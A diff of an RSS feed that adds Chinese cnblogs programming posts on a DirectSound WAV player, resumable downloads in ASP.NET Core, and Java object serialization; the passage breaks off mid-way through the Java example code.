@@ -9,6 +9,1085 @@
 <link></link>
 <description>代码改变世界</description>
 <item>
+<title>DirectSound---简易Wav播放器 - lgxZJ</title>
+<link>http://www.cnblogs.com/lgxZJ/p/8449442.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/lgxZJ/p/8449442.html</guid>
+<description>&lt;p&gt;这篇文章主要给大家介绍下如何用DirectSound打造一个简易播放器，因为篇幅有限且代码逻辑较为复杂，我们只介绍下核心技术内容。该播放器主要包括以下功能：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;播放、暂停&lt;/li&gt;
+&lt;li&gt;播放进度提示。&lt;/li&gt;
+&lt;/ul&gt;&lt;h2 id=&quot;directsound播放概念简介&quot;&gt;1. DirectSound播放概念简介&lt;/h2&gt;
+&lt;h3 id=&quot;播放相关概念&quot;&gt;1.1 播放相关概念&lt;/h3&gt;
+&lt;p&gt;首先要介绍下DirectSound的设计理念：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/02/14/5a8440af1d779.png&quot; alt=&quot;buffer-pic&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;在DirectSound中，你需要播放的音频一般需要（也可以直接放入主缓冲区，但是操作上比较困难而且对其他DirectSound程序不太友好）放入一个被称为&lt;strong&gt;次缓冲区&lt;/strong&gt;（Secondary Buffer）的地址区域中，该缓冲区由开发者人为创建操控。由于DirectSound支持多个音频同时播放，所以我们可以创建多个缓冲区并同时播放。在播放时，放入次缓冲区的音频先会被送入一个叫做&lt;strong&gt;主缓冲区&lt;/strong&gt;（Primary Buffer）的地方进行混音，然后在送入硬件声卡中进行播放。在Windows driver model，即WDM模式下，DirectSound实际上不能直接操作声卡硬件，所有的混音操作不是送给主缓冲区而是被&lt;strong&gt;送往内核混音器&lt;/strong&gt;（Kernel Mixer）进行混音，然后由内核混音器送往硬件。在WDM模式下，内核混音器替代了主缓冲区的功能位置。&lt;/p&gt;
+&lt;h3 id=&quot;缓冲区相关概念&quot;&gt;1.2 缓冲区相关概念&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/02/14/5a84440c5777b.png&quot; alt=&quot;circle-buffer&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;DirectSound的缓冲区类别大体可以分为两种：1) &lt;strong&gt;静态缓冲区&lt;/strong&gt;，2) &lt;strong&gt;流缓冲区&lt;/strong&gt;。静态缓冲区就是一段较短的音频全部填充到一个缓冲区中，然后从头到尾播放；流缓冲区可以描述为音频流，实际上这种流也是通过单个有长度的缓冲区来抽象模拟的。在流缓冲区模式下，单个缓冲区会被&lt;strong&gt;重复填充和播放&lt;/strong&gt;，也就是说当DirectSound播放到缓冲区的最后一个尾部时，它会回到缓冲区的头部继续开始播放。因此，在播放较长的音频文件时需要开发者手动循环填充缓冲区。&lt;/p&gt;
+&lt;p&gt;DirectSound中还有游标（cursor）的概念，游标分两种：1) &lt;strong&gt;播放游标&lt;/strong&gt;（play cusror），2) &lt;strong&gt;写入游标&lt;/strong&gt;（write cursor）。顾名思义，播放游标指向当前播放的地址，写入游标指向当前&lt;strong&gt;可以写入的开始地址&lt;/strong&gt;，写入游标总是在播放游标前面，且两者之间的数据块已经被DirectSound预定，不能被写入。其中，播放指针可以通过函数来更改，而写入指针由DirectSound自己控制，开发者不能操作它。一旦次缓冲区设定好音频格式，在播放中这两个游标会一直保持固定的间距：如果没记错，采样率44100Hz、2声道、8比特的音频数据，两者的位置间隔660字节，也就是&lt;code&gt;1/70&lt;/code&gt;秒的数据。&lt;/p&gt;
+&lt;p&gt;为了在适当的时候填充下一块要播放的数据，DirectSound提供了&lt;strong&gt;notify&lt;/strong&gt;的功能：当播放到某一个缓冲区位置的时候，他会提醒你。该notify功能的实现通过Windows的事件对象（Event Object）实现，也就是说你需要等待这个事件被唤醒，在GUI程序中，这通常意味着你需要另起一个线程。&lt;/p&gt;
+&lt;h2 id=&quot;播放器实现&quot;&gt;2. 播放器实现&lt;/h2&gt;
+&lt;h3 id=&quot;创建缓冲区&quot;&gt;2.1 创建缓冲区&lt;/h3&gt;
+&lt;p&gt;通过调用&lt;code&gt;IDirectSound8::CreateSoundBuffer(...)&lt;/code&gt;函数，我们创建一个能够容纳&lt;em&gt;seconds&lt;/em&gt;秒的次缓冲区。参数DSBUFFERDESC中需要指定&lt;code&gt;DSBCAPS_CTRLPOSITIONNOTIFY、DSBCAPS_GETCURRENTPOSITION2&lt;/code&gt;，前者允许我们设置notify，后者保证我们在调用&lt;code&gt;IDirectSoundBuffer8::GetCurrentPosition(...)&lt;/code&gt;时播放游标的位置比较准确。&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;void WavPlayer::createBufferOfSeconds(unsigned seconds)
+{
+    DSBUFFERDESC bufferDescription;
+    bufferDescription.dwSize = sizeof(bufferDescription);
+    bufferDescription.dwFlags = DSBCAPS_CTRLPOSITIONNOTIFY |
+                                DSBCAPS_GLOBALFOCUS |
+                                DSBCAPS_GETCURRENTPOSITION2 |
+                                DSBCAPS_LOCDEFER ;
+    bufferDescription.dwBufferBytes = m_secondaryBufferSize
+                                    = m_wavFile.getWaveFormat().nAvgBytesPerSec * seconds;
+    bufferDescription.dwReserved = 0;
+    bufferDescription.lpwfxFormat = &amp;amp;m_wavFile.getWaveFormat();
+    bufferDescription.guid3DAlgorithm = GUID_NULL;
+
+    IDirectSoundBuffer* soundBuffer;
+    if (m_directSound8-&amp;gt;CreateSoundBuffer(&amp;amp;bufferDescription, &amp;amp;soundBuffer, NULL) != DS_OK) {
+        throw std::exception(&quot;create secondary buffer failed:CreateSoundBuffer&quot;);
+    }
+
+    if (soundBuffer-&amp;gt;QueryInterface(IID_IDirectSoundBuffer8, (LPVOID*)&amp;amp;m_soundBufferInterface)
+            != S_OK) {
+        throw std::exception(&quot;IDirectSoundBuffer8 interface not supported!&quot;);
+    }
+}&lt;/code&gt;
+&lt;/pre&gt;
+&lt;h3 id=&quot;预填充缓冲区&quot;&gt;2.2 预填充缓冲区&lt;/h3&gt;
+&lt;p&gt;本人尝试过直接在缓冲区头部设置notify，使数据的填充比较自然。大多数情况下这样没有问题，但是在电脑cpu负载较高时会造成音频毛刺，效果不尽如人意。因此我选择预填充数据，防止这类情况出现。&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;void WavPlayer::fillDataIntoBuffer()
+{
+    Q_ASSERT(m_bufferSliceCount &amp;gt; 1);
+
+    //  fill half buffer to signal the notify event to do next data filling
+    LPVOID firstAudioAddress;
+    LPVOID secondAudioAddress;
+    DWORD  firstAudioBytes;
+    DWORD  secondAudioBytes;
+    HRESULT result = m_soundBufferInterface-&amp;gt;Lock(0,
+                                    m_secondaryBufferSize / m_bufferSliceCount,
+                                    &amp;amp;firstAudioAddress, &amp;amp;firstAudioBytes,
+                                    &amp;amp;secondAudioAddress, &amp;amp;secondAudioBytes,
+                                    0);
+    if (result == DSERR_BUFFERLOST) {
+        result = m_soundBufferInterface-&amp;gt;Restore();
+    }
+    if (result != DS_OK) {
+        throw std::exception(&quot;Cannot lock entire secondary buffer(restore tryed)&quot;);
+    }
+
+    Q_ASSERT(firstAudioBytes == m_secondaryBufferSize / m_bufferSliceCount &amp;amp;&amp;amp;
+            secondAudioAddress == nullptr &amp;amp;&amp;amp;
+            secondAudioBytes == 0);
+    m_nextDataToPlay = static_cast&amp;lt;char*&amp;gt;(m_wavFile.getAudioData());
+    CopyMemory(firstAudioAddress, m_nextDataToPlay, firstAudioBytes);
+    if (m_soundBufferInterface-&amp;gt;Unlock(firstAudioAddress, firstAudioBytes,
+                                    secondAudioAddress, secondAudioBytes)
+            != DS_OK) {
+        throw std::exception(&quot;Unlick failed when fill data into secondary buffer&quot;);
+    }
+
+    m_nextDataToPlay += firstAudioBytes;
+}&lt;/code&gt;
+&lt;/pre&gt;
+&lt;h3 id=&quot;设置缓冲区notify&quot;&gt;2.3 设置缓冲区notify&lt;/h3&gt;
+&lt;p&gt;为了在运行时循环填充数据，我们先要设置notify，这里的notify比较复杂，包含了3种类别：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;数据填充notify。&lt;/li&gt;
+&lt;li&gt;音频播放终止notify。&lt;/li&gt;
+&lt;li&gt;退出notify。（为了优雅的退出填充线程，我们选择在退出播放时唤醒线程）&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;其中，第二种notify可能会也可能不会与第一种notify重合，在不重合情况下我们才新分配一个notify：&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;m_additionalNotifyIndex = 0;
+if (m_additionalEndNotify)
+    for (unsigned i = 1; i &amp;lt; m_bufferSliceCount; ++i)
+        if (bufferEndOffset &amp;lt; (m_secondaryBufferSize / m_bufferSliceCount * i)) {
+            m_additionalNotifyIndex = i;
+            break;
+        }
+
+//  add a stop notify count at the end of entire notifies to make the data filling
+//  thread exit gracefully
+++m_notifyCount;
+m_notifyHandles = static_cast&amp;lt;HANDLE*&amp;gt;(malloc(sizeof(HANDLE)* (m_notifyCount)));
+if (m_notifyHandles == nullptr)
+    throw std::exception(&quot;malloc error&quot;);
+m_notifyOffsets = static_cast&amp;lt;DWORD*&amp;gt;(malloc(sizeof(DWORD)* (m_notifyCount)));
+if (m_notifyHandles == nullptr)
+    throw std::exception(&quot;malloc error&quot;);
+
+for (unsigned i = 0; i &amp;lt; m_notifyCount; ++i) {
+    m_notifyHandles[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
+    if (m_notifyHandles[i] == NULL)
+        throw std::exception(&quot;CreateEvent error&quot;);
+
+    if (m_additionalEndNotify &amp;amp;&amp;amp; i == m_additionalNotifyIndex) {
+        //  set buffer end notify
+        m_notifyOffsets[i] = bufferEndOffset;
+        m_endNotifyHandle = m_notifyHandles[i];
+    }
+    else if (i == m_notifyCount - 1) {
+        //  do nothing
+    } else {
+        //  NOTE:   the entire buffer size must can be devided by this `notifyCount`,
+        //  or it will lost some bytes when filling data into the buffer. since the end
+        //  notify is inside the notify count, we need to calculate the buffer slice index.
+        unsigned bufferSliceIndex = getBufferIndexFromNotifyIndex(i);
+        m_notifyOffsets[i] = m_secondaryBufferSize / m_bufferSliceCount * bufferSliceIndex;
+        
+        if (!m_additionalEndNotify &amp;amp;&amp;amp; m_notifyOffsets[i] == bufferEndOffset)
+            m_endNotifyHandle = m_notifyHandles[i];
+    }
+}
+//  skip the exit notify which we toggle explicitly
+setNotifyEvent(m_notifyHandles, m_notifyOffsets, m_notifyCount - 1);&lt;/code&gt;
+&lt;/pre&gt;
+&lt;h3 id=&quot;创建数据填充线程播放进度更新&quot;&gt;2.4 创建数据填充线程、播放进度更新&lt;/h3&gt;
+&lt;p&gt;该线程一直等待多个notify，并对不同情况进行不同的处理：&lt;/p&gt;
+&lt;ol&gt;&lt;li&gt;播放终止notify，则发出终止信号、退出线程。&lt;/li&gt;
+&lt;li&gt;数据填充notify，则填充数据、更新播放进度。&lt;/li&gt;
+&lt;li&gt;非终止非数据填充notify（发生在数据填充完成但播放未结束时），continue。&lt;/li&gt;
+&lt;/ol&gt;&lt;p&gt;DWORD WINAPI WavPlayer::dataFillingThread(LPVOID param)&lt;br/&gt;{&lt;br/&gt;WavPlayer* wavPlayer = reinterpret_cast&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;while (!wavPlayer-&amp;gt;m_quitDataFillingThread) {
+    try {
+        DWORD notifyIndex = WaitForMultipleObjects(wavPlayer-&amp;gt;m_notifyCount, wavPlayer-&amp;gt;m_notifyHandles, FALSE, INFINITE);
+        if (!(notifyIndex &amp;gt;= WAIT_OBJECT_0 &amp;amp;&amp;amp;
+              notifyIndex &amp;lt;= WAIT_OBJECT_0 + wavPlayer-&amp;gt;m_notifyCount - 1))
+
+            throw std::exception(&quot;WaitForSingleObject error&quot;);
+
+        if (notifyIndex == wavPlayer-&amp;gt;m_notifyCount - 1)
+            break;
+
+        //  each notify represents one second(or approximately one second) except the exit notify
+        if (!(wavPlayer-&amp;gt;m_additionalNotifyIndex == notifyIndex &amp;amp;&amp;amp; wavPlayer-&amp;gt;m_endNotifyLoopCount &amp;gt; 0)) {
+            ++wavPlayer-&amp;gt;m_currentPlayingTime;
+            wavPlayer-&amp;gt;sendProgressUpdatedSignal();
+        }
+
+        //  if return false, the audio ends
+        if (tryToFillNextBuffer(wavPlayer, notifyIndex) == false) {
+            wavPlayer-&amp;gt;stop();
+
+            ++wavPlayer-&amp;gt;m_currentPlayingTime;
+            wavPlayer-&amp;gt;sendProgressUpdatedSignal();
+
+            wavPlayer-&amp;gt;sendAudioEndsSignal();
+            //  not break the loop, we need to update the audio progress although data filling ends
+        }
+    }
+    catch (std::exception&amp;amp; exception) {
+        OutputDebugStringA(&quot;exception in data filling thread:&quot;);
+        OutputDebugStringA(exception.what());
+    }
+}
+return 0;&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;}&lt;/p&gt;
+&lt;h2 id=&quot;运行结果&quot;&gt;3. 运行结果&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/02/15/5a851af71dd92.png&quot; alt=&quot;result1&quot;/&gt;&lt;img src=&quot;https://i.loli.net/2018/02/15/5a851af70ddfa.png&quot; alt=&quot;result2&quot;/&gt;&lt;img src=&quot;https://i.loli.net/2018/02/15/5a851af71dd8f.png&quot; alt=&quot;result3&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;完整代码见&lt;a href=&quot;https://github.com/lgxZJ/Miscellaneous/tree/master/Audio/DirectSoundPlay&quot;&gt;链接&lt;/a&gt;。&lt;/p&gt;
+</description>
+<pubDate>Thu, 15 Feb 2018 05:36:00 +0000</pubDate>
+<dc:creator>lgxZJ</dc:creator>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/lgxZJ/p/8449442.html</dc:identifier>
+</item>
+<item>
+<title>发放春节福利，ASP.NET Core断点续传 - Jeffcky</title>
+<link>http://www.cnblogs.com/CreateMyself/p/8449414.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/CreateMyself/p/8449414.html</guid>
+<description>&lt;h2 id=&quot;asp.net-core断点续传&quot;&gt;ASP.NET Core断点续传&lt;/h2&gt;
+&lt;p&gt;在ASP.NET WebAPi写过完整的断点续传文章，目前我对ASP.NET Core仅止于整体上会用，对于原理还未去深入学习，由于有园友想看断点续传在ASP.NET Core中的具体实现，于是借助在家中休息时间看了下ASP.NET Core是否支持断点续传以及支持后具体实现以及相关APi，花了一点时间，本文而由此而生。&lt;/p&gt;
+&lt;h2 id=&quot;断点续传基础&quot;&gt;断点续传基础&lt;/h2&gt;
+&lt;p&gt;此前在ASP.NET WebAPi中对于一些基础内容已经详细讲解过，同时也进行了封装，所以再处理ASP.NET Core不过是APi使用不同罢了，断点续传重点在于AcceptRange和ContentRange以及对应响应请求头设置，其余和ASP.NET WebAPi使用别无二致。&lt;/p&gt;
+&lt;p&gt;在ASP.NET WebAPi中我们封装了对文件的操作接口IFileProvider和具体实现FileProvider，在控制器中我们是直接实例化，在ASP.NET Core中有了依赖注入，我们可直接借助控制器构造函数注入接口。&lt;/p&gt;
+&lt;pre class=&quot;c#&quot;&gt;
+&lt;code&gt;public void ConfigureServices(IServiceCollection services)
+{
+    services.AddMvc();
+
+    services.AddScoped&amp;lt;IFileProvider, FileProvider&amp;gt;();
+}
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;当然前提是新建一个ASP.NET Core Web应用程序，然后我们新建一个DownLoadController控制器。在ASP.NET WebAPi中对于请求-响应机制对象是HttpRequestMessage和HttpResponseMessage，而在ASP.NET Core则是HttpRequest和HttpResponse对象。那么我们在控制器中如何获取这两个对象中呢？如果我们稍微有点经验的话就能明了请求和响应对象必然存储在上下文中，那么我们又如何获取上下文呢？通过IHttpContextAccessor接口获取。所以在控制器构造函数中获取文件接口和上下文以及对应的常量如下：&lt;/p&gt;
+&lt;pre class=&quot;c#&quot;&gt;
+&lt;code&gt;private const int BufferSize = 80 * 1024;
+
+private const string MimeType = &quot;application/octet-stream&quot;;
+public IFileProvider _fileProvider { get; set; }
+
+private IHttpContextAccessor _contextAccessor;
+private HttpContext _context { get { return _contextAccessor.HttpContext; } }
+public FileDownloadController(
+    IFileProvider fileProvider,
+    IHttpContextAccessor contextAccessor)
+{
+    _fileProvider = fileProvider;
+    _contextAccessor = contextAccessor;
+}
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;在ASP.NET WebAPi中获取请求头Range利用请求中的Headers属性获取，但在ASP.NET Core中则需要通过请求中的GetTypedHeaders()方法获取。&lt;/p&gt;
+&lt;p&gt;ASP.NET Core对于请求头中参数的获取和值的设置更加友好，比如我们要获取请求头中的请求类型，在ASP.NET WebAPi中我们指定字符串Request.Headers[&quot;Content-Type&quot;]，而在ASP.NET Core中则对应的是Request.Headers[HeaderNames.ContentType]，直接通过枚举指定，如此一来则省事多了。最终在DownLoadController控制器中对于在ASP.NET Core中断点续传的整个逻辑如下：&lt;/p&gt;
+&lt;pre class=&quot;c#&quot;&gt;
+&lt;code&gt;public class FileDownloadController
+{
+    private const int BufferSize = 80 * 1024;
+
+    private const string MimeType = &quot;application/octet-stream&quot;;
+    public IFileProvider _fileProvider { get; set; }
+
+    private IHttpContextAccessor _contextAccessor;
+    private HttpContext _context { get { return _contextAccessor.HttpContext; } }
+    public FileDownloadController(
+        IFileProvider fileProvider,
+        IHttpContextAccessor contextAccessor)
+    {
+        _fileProvider = fileProvider;
+        _contextAccessor = contextAccessor;
+    }
+
+
+    /// &amp;lt;summary&amp;gt;
+    /// 下载文件
+    /// &amp;lt;/summary&amp;gt;
+    /// &amp;lt;param name=&quot;fileName&quot;&amp;gt;&amp;lt;/param&amp;gt;
+    /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
+    [HttpGet(&quot;api/download&quot;)]
+    public IActionResult GetFile(string fileName)
+    {
+        fileName = &quot;cn_windows_8_1_x64_dvd_2707237.iso&quot;;
+
+        if (!_fileProvider.Exists(fileName))
+        {
+            return new StatusCodeResult(StatusCodes.Status404NotFound);
+        }
+
+        //获取下载文件长度
+        var fileLength = _fileProvider.GetLength(fileName);
+
+        //初始化下载文件信息
+        var fileInfo = GetFileInfoFromRequest(_context.Request, fileLength);
+
+        //获取剩余部分文件流
+        var stream = new PartialContentFileStream(_fileProvider.Open(fileName),
+                                             fileInfo.From, fileInfo.To);
+        //设置响应 请求头
+        SetResponseHeaders(_context.Response, fileInfo, fileLength, fileName);
+
+        return new FileStreamResult(stream, new MediaTypeHeaderValue(MimeType));
+    }
+
+
+    /// &amp;lt;summary&amp;gt;
+    /// 根据请求信息赋予封装的文件信息类
+    /// &amp;lt;/summary&amp;gt;
+    /// &amp;lt;param name=&quot;request&quot;&amp;gt;&amp;lt;/param&amp;gt;
+    /// &amp;lt;param name=&quot;entityLength&quot;&amp;gt;&amp;lt;/param&amp;gt;
+    /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
+    private FileInfo GetFileInfoFromRequest(HttpRequest request, long entityLength)
+    {
+        var fileInfo = new FileInfo
+        {
+            From = 0,
+            To = entityLength - 1,
+            IsPartial = false,
+            Length = entityLength
+        };
+
+        var requestHeaders = request.GetTypedHeaders();
+
+        if (requestHeaders.Range != null &amp;amp;&amp;amp; requestHeaders.Range.Ranges.Count &amp;gt; 0)
+        {
+            var range = requestHeaders.Range.Ranges.FirstOrDefault();
+            if (range.From.HasValue &amp;amp;&amp;amp; range.From &amp;lt; 0 || range.To.HasValue &amp;amp;&amp;amp; range.To &amp;gt; entityLength - 1)
+            {
+                return null;
+            }
+
+            var start = range.From;
+            var end = range.To;
+
+            if (start.HasValue)
+            {
+                if (start.Value &amp;gt;= entityLength)
+                {
+                    return null;
+                }
+                if (!end.HasValue || end.Value &amp;gt;= entityLength)
+                {
+                    end = entityLength - 1;
+                }
+            }
+            else
+            {
+                if (end.Value == 0)
+                {
+                    return null;
+                }
+
+                var bytes = Math.Min(end.Value, entityLength);
+                start = entityLength - bytes;
+                end = start + bytes - 1;
+            }
+
+            fileInfo.IsPartial = true;
+            fileInfo.Length = end.Value - start.Value + 1;
+        }      
+        return fileInfo;
+    }
+
+    /// &amp;lt;summary&amp;gt;
+    /// 设置响应头信息
+    /// &amp;lt;/summary&amp;gt;
+    /// &amp;lt;param name=&quot;response&quot;&amp;gt;&amp;lt;/param&amp;gt;
+    /// &amp;lt;param name=&quot;fileInfo&quot;&amp;gt;&amp;lt;/param&amp;gt;
+    /// &amp;lt;param name=&quot;fileLength&quot;&amp;gt;&amp;lt;/param&amp;gt;
+    /// &amp;lt;param name=&quot;fileName&quot;&amp;gt;&amp;lt;/param&amp;gt;
+    private void SetResponseHeaders(HttpResponse response, FileInfo fileInfo,
+                                  long fileLength, string fileName)
+    {
+        response.Headers[HeaderNames.AcceptRanges] = &quot;bytes&quot;;
+        response.StatusCode = fileInfo.IsPartial ? StatusCodes.Status206PartialContent
+                                  : StatusCodes.Status200OK;
+
+        var contentDisposition = new ContentDispositionHeaderValue(&quot;attachment&quot;);
+        contentDisposition.SetHttpFileName(fileName);
+        response.Headers[HeaderNames.ContentDisposition] = contentDisposition.ToString();
+        response.Headers[HeaderNames.ContentType] = MimeType;
+        response.Headers[HeaderNames.ContentLength] = fileInfo.Length.ToString();
+        if (fileInfo.IsPartial)
+        {
+            response.Headers[HeaderNames.ContentRange] = new ContentRangeHeaderValue(fileInfo.From, fileInfo.To, fileLength).ToString();
+        }
+    }
+}
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/589642/201802/589642-20180215130934077-1703033212.gif&quot;/&gt;&lt;/p&gt;
+&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
+&lt;p&gt;ASP.NET Core中FileResult、FileStreamResult、FilePhsicalResult都已支持断点续传，如果对于很小的文件直接下载即可，如果稍微大一点文件则可利用断点续传即可，如果对于非常大的文件则需要自定义流来下载这样更高效，比如对于获取视频流文件。上述我们依然是采取自定义流的形式来实现断点续传，若对其中封装的自定义流和接口有疑惑请移步右上角我的github参看ASP.NET WebAPi具体实现。无论是ASP.NET WebAPi和ASP.NET Core断点续传都实现了核心逻辑，对于一些细节未考虑其中，希望对想学习断点续传的您有所帮助，祝您阅读愉快，新年快乐！完整代码，我会上传到github！&lt;/p&gt;
+</description>
+<pubDate>Thu, 15 Feb 2018 05:17:00 +0000</pubDate>
+<dc:creator>Jeffcky</dc:creator>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/CreateMyself/p/8449414.html</dc:identifier>
+</item>
+<item>
+<title>Java对象序列化 - zxzhang</title>
+<link>http://www.cnblogs.com/zzy19961112/p/8447656.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/zzy19961112/p/8447656.html</guid>
+<description>&lt;h2&gt;&lt;span&gt;为什么需要序列化&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span&gt;  当我们创建对象时，只要需要，对象就会一直存在，但在程序终止的时候，无论如何它都不会继续存在。这么做有一定的意义，但是如果对象能够在程序不运行的情况下仍能存在并保存其信息，这样，在下次运行程序时，该对象将被重建并且拥有的信息与在程序上次运行时它所拥有的信息相同。为达到这目的，通常的做法可以写入文件或数据库，这样有其优点，但缺乏了某些便利性，在Java中，通过序列化技术，可以将对象声明为“持久性”的，为我们处理所有细节，显得十分方便。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;  Java的对象序列化将那些实现了 Serializable 接口的对象转换成一个字节序列，并能够在以后将这个字节序列完全恢复为原来的对象，这一过程甚至可以通过网络进行，也意味着能自动弥补不同操作系统之间的差异，运行在 Windows 系统的计算机上创建一个对象并序列化，通过网络将其发送给一台运行 Unix 系统的计算机，不必担心数据在不同机器上表示不同从而在那里重新组装。&lt;/span&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span&gt;序列化的用途&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span&gt;  利用对象序列化可以实现轻量级持久性。”持久性“意味着一个对象的生存周期并不取决于程序是否正在执行，它可以生存于程序的调用之间。通过将一个序列化对象写入磁盘，然后重新调用程序时恢复该对象，就能够实现持久化的效果。对象序列化主要用于两个方面&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;&lt;span&gt;远程方法调用（Remote Method Invocation，RMI），使存活于其他计算机上的对象使用起来就像是存活于本机上一样，当向远程对象发送消息时，需要通过对象序列化来传输参数和返回值&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span&gt;Java Beans。使用一个Bean时，一般情况下是在设计阶段对它的状态信息进行配置，这种状态信息必须保存下来，并在程序启动时进行后期恢复，这种具体工作就是由对象序列化完成的。&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;h2&gt;&lt;span&gt;如何实现序列化&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span&gt;  要序列化一个对象，首先要创建某些OutputStream对象，然后将其封装在一个ObjectOutputStream对象内。这时，只需调用writeObject()即可将对象序列化，并将其发送个 OutputStream（对象化序列是基于字节的，因要使用 InputStream 和 OutputStream 继承层次结构）。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;  反向序列化（即将一个序列还原为一个对象），需要将一个 InputStream 封装在 ObjectInputStream 内，然后调用 readObject()。&lt;/span&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;&lt;span&gt;package&lt;/span&gt; &lt;span&gt;test&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
+
+&lt;span&gt;import&lt;/span&gt; &lt;span&gt;java.io.*&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
+
+&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; &lt;span&gt;SerializableDemo&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; Serializable&lt;span&gt;{&lt;/span&gt;
+    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;String&lt;span&gt;[]&lt;/span&gt; args&lt;span&gt;)&lt;/span&gt; &lt;span&gt;throws&lt;/span&gt; IOException&lt;span&gt;,&lt;/span&gt; ClassNotFoundException &lt;span&gt;{&lt;/span&gt;
+        User user &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; User&lt;span&gt;();&lt;/span&gt;
+        user&lt;span&gt;.&lt;/span&gt;&lt;span&gt;setUsername&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;hello&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+        user&lt;span&gt;.&lt;/span&gt;&lt;span&gt;setPasswd&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;world&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+
+        &lt;span&gt;//write Obj to File&lt;/span&gt;
+        ObjectOutputStream oos &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ObjectOutputStream&lt;span&gt;(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; FileOutputStream&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;file&quot;&lt;/span&gt;&lt;span&gt;));&lt;/span&gt;
+        oos&lt;span&gt;.&lt;/span&gt;&lt;span&gt;writeObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;user&lt;span&gt;);&lt;/span&gt;
+        oos&lt;span&gt;.&lt;/span&gt;&lt;span&gt;close&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+
+        &lt;span&gt;//read Obj from File&lt;/span&gt;
+        File file &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; File&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;file&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+        ObjectInputStream ois &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ObjectInputStream&lt;span&gt;(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; FileInputStream&lt;span&gt;(&lt;/span&gt;file&lt;span&gt;));&lt;/span&gt;
+        User newUser &lt;span&gt;=&lt;/span&gt; &lt;span&gt;(&lt;/span&gt;User&lt;span&gt;)&lt;/span&gt;ois&lt;span&gt;.&lt;/span&gt;&lt;span&gt;readObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+        ois&lt;span&gt;.&lt;/span&gt;&lt;span&gt;close&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+        System&lt;span&gt;.&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;println&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;newUser&lt;span&gt;);&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;}&lt;/span&gt;
+
+&lt;span&gt;class&lt;/span&gt; &lt;span&gt;User&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; Serializable&lt;span&gt;{&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; String username&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; String passwd&lt;span&gt;;&lt;/span&gt;
+
+    &lt;span&gt;public&lt;/span&gt; String &lt;span&gt;getUsername&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
